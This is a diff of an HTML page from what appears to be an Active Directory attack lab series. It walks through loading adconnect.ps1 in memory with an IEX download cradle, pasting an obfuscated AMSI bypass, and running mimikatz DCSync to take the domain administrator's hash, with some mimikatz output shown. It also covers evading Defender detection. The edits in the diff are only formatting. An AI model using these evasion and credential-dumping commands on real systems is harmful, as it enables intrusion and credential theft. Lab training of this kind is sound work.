@@ -357,7 +357,7 @@ Now that we do have remotely accessed US-ADCONNECT, let’s run InvisiShell to b
 <ul>
 <li>Direct Execution is Easily Detected: Running tools like adconnect.ps1 directly from an attacker's IP address makes it easy for security tools to detect the activity. Security mechanisms, such as Windows Defender and Microsoft Defender for Endpoint (MDE), are designed to identify known malicious tools, their signatures, and their behaviors.</li>
 <li>Network Traffic Monitoring: When adconnect.ps1 is executed from an external IP, it generates network traffic that can be monitored and flagged by security tools.</li>
-<li>LSASS Process Access is a Red Flag: Tools like adconnect.ps1 attempt to access the LSASS process to extract credentials from memory. </li>
+<li>LSASS Process Access is a Red Flag: Tools like adconnect.ps1 attempt to access the LSASS process to extract credentials from memory.</li>
 </ul>
 This is a highly suspicious activity that will easily be detected and is a major indicator of a malicious attack.
 <ul>
@@ -414,7 +414,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/adconnect.p
 Once we execute how command above, our adconnect.ps1 is request and imported into the memory. Please be aware that what we did will just create a new PowerShell process, so we need to bypass AMSI again. We can simply copy/paste our ASMI bypass code into our session.
 <img src="./images/screenshot_283.png" alt="">
 
-<pre><code>S<code>eT-It</code>em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( <a href="  "{1}{0}"-F'F','rE'  ">TYpE</a> )  ;    (    Get-varI<code>A</code>BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A<code>ss</code>Embly"."GET<code>TY</code>Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g<code>etf</code>iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE<code>T</code>VaLUE"(  ${n<code>ULl},${t</code>RuE} )
+<pre><code class="language-bash">S<code>eT-It</code>em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( <a href="  "{1}{0}"-F'F','rE'  ">TYpE</a> )  ;    (    Get-varI<code>A</code>BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A<code>ss</code>Embly"."GET<code>TY</code>Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g<code>etf</code>iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE<code>T</code>VaLUE"(  ${n<code>ULl},${t</code>RuE} )
 </code></pre>
 
 <p>Now we can safely execute our adconnect.</p>
@@ -455,12 +455,12 @@ This will allow us to run DCSync without any alerts!
 We can now use Invoke-Mimi.ps1
 Import-Module C:\AD\Tools\Invoke-Mimi.ps1
 Invoke-Mimi -Command '"lsadump::dcsync /user:techcorp\administrator /domain:techcorp.local"'
-<pre><code>  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 18:36:14
+<pre><code class="language-bash">  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 18:36:14
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
  ## / \ ##  /<em><strong> Benjamin DELPY <code>gentilkiwi</code> ( benjamin@gentilkiwi.com )
- ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        > https://pingcastle.com / https://mysmartlogon.com </strong></em>/</p>
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com </strong></em>/</p>
 
 <p>mimikatz(powershell) # lsadump::dcsync /user:techcorp\administrator /domain:techcorp.local
 [DC] 'techcorp.local' will be the domain
@@ -550,7 +550,7 @@ Object Relative ID   : 500</p>
 
 
 
-          <div class="part-navigation">
+<div class="part-navigation">
             <a href="part-22-cross-domain-attacks-unconstrained-delegation-to-e.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Cross Domain Attacks - Unconst</a>
             <a href="part-24-cross-domain-attacks-child-to-forest-root-sid-hist.html">Next: Cross Domain attacks - Child T <ion-icon name="arrow-forward-outline"></ion-icon></a>
           </div>
